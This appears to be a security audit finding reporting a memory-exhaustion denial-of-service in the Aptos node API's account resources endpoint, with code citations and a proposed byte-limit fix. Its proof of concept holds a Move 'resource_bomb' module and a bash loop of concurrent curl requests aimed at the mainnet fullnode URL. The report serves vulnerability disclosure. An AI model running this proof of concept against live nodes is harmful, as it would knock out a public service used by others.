# Audit Report

## Title
Memory Amplification Denial of Service via Unbounded Account Resources API Endpoint

## Summary
The `/accounts/:address/resources` API endpoint allows requesting up to 9,999 resources in a single call with no total byte size limit, enabling attackers to exhaust API server memory by creating accounts with thousands of maximum-sized resources and making concurrent requests.

## Finding Description

The vulnerability exists in the account resources retrieval flow where memory consumption is bounded only by resource **count** rather than total **byte size**. [1](#0-0) 

The API allows up to 9,999 resources per request by default. During transaction execution, each individual resource can be up to 1 MB in size: [2](#0-1) 

The critical flaw is in `get_resources_by_pagination`, which loads all requested resources into memory without checking total byte size: [3](#0-2) 

All resources are collected into a `Vec` in memory at once. For JSON responses, the resources are then deserialized and converted, requiring additional memory: [4](#0-3) 

Additionally, resource groups are expanded **after** the limit is applied, potentially increasing the actual number of resources beyond 9,999: [5](#0-4) 

**Attack Path:**

1. Attacker creates an account and submits ~1,000 transactions
2. Each transaction creates ~10 resources of ~1 MB each (within the 10 MB per-transaction limit)
3. Account accumulates 10,000 resources totaling ~10 GB
4. Attacker sends multiple concurrent GET requests to `/accounts/{address}/resources?limit=9999`
5. Each request loads ~10 GB into API server memory
6. Server memory exhaustion causes API crashes or complete denial of service

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This qualifies as **High Severity** per the Aptos bug bounty program criteria:

- **API crashes**: Explicitly listed as High Severity (up to $50,000)
- **Validator node slowdowns**: If the API runs on validator nodes (common in production)

The theoretical maximum memory per request is **9,999 resources Ã— 1 MB = ~9.76 GB**, with JSON conversion requiring additional overhead. Just 2-3 concurrent requests targeting such accounts could exhaust 32 GB server RAM. Sustained attacks render the API completely unavailable.

## Likelihood Explanation

**Likelihood: HIGH**

- No authentication required beyond standard transaction submission
- Resource creation is economically feasible (only gas costs, not per-resource storage fees beyond normal transaction limits)
- Attack can be automated and sustained
- No rate limiting on resource count or total response size
- Pagination doesn't mitigate since users can request maximum limit in single call

The attack is straightforward to execute and requires minimal resources from the attacker.

## Recommendation

Implement a total response byte size limit in addition to the resource count limit:

```rust
// In api/src/context.rs, modify get_resources_by_pagination:
const MAX_RESPONSE_BYTES: usize = 100_000_000; // 100 MB limit

pub fn get_resources_by_pagination(
    &self,
    address: AccountAddress,
    prev_state_key: Option<&StateKey>,
    version: u64,
    limit: u64,
) -> Result<(Vec<(StructTag, Vec<u8>)>, Option<StateKey>)> {
    // ... existing code ...
    
    let mut total_bytes: usize = 0;
    let mut kvs = Vec::new();
    
    for item in resource_iter.by_ref().take(limit as usize) {
        let (tag, value) = item?;
        let item_size = value.len() + std::mem::size_of::<StructTag>();
        
        // Check if adding this item would exceed byte limit
        if total_bytes + item_size > MAX_RESPONSE_BYTES {
            // Return early with cursor pointing to this item
            return Ok((kvs, Some(StateKey::resource(&address, &tag)?)));
        }
        
        total_bytes += item_size;
        kvs.push((tag, value));
    }
    
    // ... rest of existing code ...
}
```

Additionally:
1. Lower the default `max_account_resources_page_size` from 9,999 to a more reasonable value (e.g., 1,000)
2. Add response size metrics and monitoring
3. Consider streaming responses for large result sets
4. Document the byte size limit in API specifications

## Proof of Concept

```move
// File: attack_module.move
module attacker::resource_bomb {
    use std::vector;
    
    // Resource with large data payload
    struct LargeResource has key {
        // ~1 MB of data (250k u32 values * 4 bytes each)
        data: vector<u32>
    }
    
    // Create multiple large resources
    public entry fun create_resources(account: &signer, count: u64) {
        let i = 0;
        while (i < count) {
            let data = vector::empty<u32>();
            let j = 0;
            // Fill with ~1 MB of data
            while (j < 250000) {
                vector::push_back(&mut data, j);
                j = j + 1;
            };
            
            move_to(account, LargeResource { data });
            i = i + 1;
        };
    }
}
```

**Exploitation steps:**

1. Deploy the `resource_bomb` module
2. Execute `create_resources` function across ~1,000 transactions (creating ~10 resources per transaction within gas limits)
3. Send concurrent HTTP requests:
   ```bash
   for i in {1..10}; do
     curl "https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xATTACKER_ADDRESS/resources?limit=9999" &
   done
   ```
4. Monitor API server memory consumption spiking to >50 GB
5. API becomes unresponsive or crashes

**Notes:**

The vulnerability is confirmed through code analysis. The API layer has no total byte size enforcement, relying solely on resource count limits that are too high given individual resources can be 1 MB each. The combination of high count limits (9,999) and high per-resource size limits (1 MB) creates an exploitable memory amplification vector.

### Citations

**File:** config/src/config/api_config.rs (L100-100)
```rust
const DEFAULT_MAX_ACCOUNT_RESOURCES_PAGE_SIZE: u16 = 9999;
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L154-156)
```rust
            max_bytes_per_write_op: NumBytes,
            { 5.. => "max_bytes_per_write_op" },
            1 << 20, // a single state item is 1MB max
```

**File:** api/src/context.rs (L526-529)
```rust
        let kvs = resource_iter
            .by_ref()
            .take(limit as usize)
            .collect::<Result<Vec<(StructTag, Vec<u8>)>>>()?;
```

**File:** api/src/context.rs (L536-551)
```rust
        let kvs = kvs
            .into_iter()
            .map(|(tag, value)| {
                if converter.is_resource_group(&tag) {
                    // An error here means a storage invariant has been violated
                    bcs::from_bytes::<ResourceGroup>(&value)
                        .map(|map| map.into_iter().collect::<Vec<_>>())
                        .map_err(|e| e.into())
                } else {
                    Ok(vec![(tag, value)])
                }
            })
            .collect::<Result<Vec<Vec<(StructTag, Vec<u8>)>>>>()?
            .into_iter()
            .flatten()
            .collect();
```

**File:** api/src/accounts.rs (L476-490)
```rust
                let state_view = self
                    .context
                    .latest_state_view_poem(&self.latest_ledger_info)?;
                let converter = state_view
                    .as_converter(self.context.db.clone(), self.context.indexer_reader.clone());
                let converted_resources = converter
                    .try_into_resources(resources.iter().map(|(k, v)| (k.clone(), v.as_slice())))
                    .context("Failed to build move resource response from data in DB")
                    .map_err(|err| {
                        BasicErrorWith404::internal_with_code(
                            err,
                            AptosErrorCode::InternalError,
                            &self.latest_ledger_info,
                        )
                    })?;
```
